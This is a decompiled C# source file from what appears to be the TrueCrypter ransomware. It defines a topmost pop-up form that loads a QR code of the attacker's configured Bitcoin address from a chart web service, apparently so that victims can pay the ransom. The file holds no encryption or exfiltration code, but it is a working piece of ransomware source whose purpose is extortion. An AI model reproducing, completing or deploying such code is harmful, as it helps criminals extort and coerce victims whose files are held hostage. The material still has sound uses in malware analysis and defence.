using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using TrueCrypter.Config;

namespace TrueCrypter.Ransomware.Core.Forms;

public class frmQRCode : Form
{
	private IContainer components = null;

	private PictureBox imgQR;

	public frmQRCode()
	{
		InitializeComponent();
	}

	private void frmQRCode_Load(object sender, EventArgs e)
	{
		imgQR.Load("http://chart.apis.google.com/chart?cht=qr&chld=Q|2&chs=200&chl=" + Settings.BitcoinAddress);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		imgQR = new PictureBox();
		((ISupportInitialize)imgQR).BeginInit();
		((Control)this).SuspendLayout();
		((Control)imgQR).set_Location(new Point(-2, -2));
		((Control)imgQR).set_Name("imgQR");
		((Control)imgQR).set_Size(new Size(200, 200));
		imgQR.set_SizeMode((PictureBoxSizeMode)1);
		imgQR.set_TabIndex(1);
		imgQR.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(197, 197));
		((Control)this).get_Controls().Add((Control)(object)imgQR);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("frmQRCode");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)4);
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)frmQRCode_Load);
		((ISupportInitialize)imgQR).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
